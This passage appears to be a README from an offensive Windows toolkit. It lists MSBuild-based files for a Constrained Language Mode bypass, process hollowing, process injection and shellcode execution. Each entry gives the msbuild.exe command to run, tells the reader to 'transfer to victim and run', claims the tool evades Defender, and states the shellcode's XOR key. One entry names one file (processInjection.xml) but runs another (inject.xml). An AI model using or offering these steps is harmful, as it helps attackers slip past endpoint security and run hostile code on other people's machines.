### CLM Bypass
- The source file `clm-bypass.xml` can be used to bypass CLM and obtain FullLanguage mode within the same session, transfer to victim and run: 
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe clm-bypass.xml`

### Process Hollowing
- The file `hollow.xml` can be used to perform process hollowing, very stable and bypass defender, transfer to victim and run:
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe hollow.xml`
- *NOTE: shellcode is XOR'd with key: 0xfa*

### Process Injection
- The file `processInjection.xml` can be used to perform process injection, very stable and bypass defender, transfer to victim and run:
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe inject.xml`
- *NOTE: shellcode is XOR'd with key: 0xfa*

### Shellcode Runner
- The file `shellcodeRunner.xml` used to inject and execute shellcode to the current process, transfer to victim and run:
- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe shellcodeRunner.xml`
- *NOTE: shellcode is XOR'd with key: 0xfa*
